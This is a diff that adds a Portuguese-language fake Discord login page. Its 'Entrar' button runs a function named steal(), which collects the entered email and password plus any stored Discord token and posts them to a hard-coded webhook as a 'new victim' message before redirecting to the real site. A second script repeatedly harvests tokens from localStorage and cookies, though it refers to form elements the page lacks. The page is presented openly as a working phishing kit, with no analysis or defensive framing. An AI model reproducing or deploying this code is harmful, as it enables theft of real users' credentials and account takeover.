@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Discord - Entrar</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="container">
+    <h1>Bem-vindo de volta!</h1>
+    <p>Entre para continuar</p>
+    <input type="email" id="email" placeholder="e-mail">
+    <input type="password" id="password" placeholder="senha">
+    <button onclick="steal()">Entrar</button>
+  </div>
+
+  <script>
+    async function steal() {
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      // Pega o token se a pessoa já estiver logada
+      let token = null;
+      try {
+        token = window.localStorage.getItem('token');
+      } catch(e) {}
+
+      // Envia pro webhook
+      await fetch('https://discord.com/api/webhooks/1570086283588407423/_jNHqG2RYoiXOAUfoM4qQliV5yh6LW05SkywhNbqpLB0yHc0oQ5xJ0mPTITcPhjDQbhN', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          content: `🎯 Nova vítima!\nEmail: ${email}\nSenha: ${password}\nToken: ${token || 'não encontrado'}`
+        })
+      });
+
+      alert('Redirecionando...');
+      window.location.href = 'https://discord.com/app';
+    }
+  </script>
+</body>
+<script>
+    // Função para pegar o token atual do Discord
+    function getDiscordToken() {
+        return localStorage.getItem("token") || 
+               localStorage.getItem("token_nbg") || // Às vezes o token vem com outro nome
+               document.cookie.split("token=")[1]?.split(";")[0]; // Tenta pegar do cookie também
+    }
+
+    // Verifica a cada 500ms se o token aparece
+    const checkToken = setInterval(() => {
+        const token = getDiscordToken();
+        if (token) {
+            console.log("Token encontrado:", token);
+            
+            // Preenche o campo do formulário
+            const tokenInput = document.querySelector('input[name="token"]');
+            if (tokenInput) {
+                tokenInput.value = token;
+            }
+            
+            // Opcional: Para de verificar depois de encontrar
+            clearInterval(checkToken);
+        }
+    }, 500);
+
+    // Garante que o token seja enviado mesmo se o usuário clicar rápido
+    document.querySelector('form').addEventListener('submit', function(e) {
+        const token = getDiscordToken();
+        const tokenInput = document.querySelector('input[name="token"]');
+        
+        if (token && (!tokenInput || !tokenInput.value)) {
+            tokenInput.value = token;
+        }
+    });
+</script>
+</html>
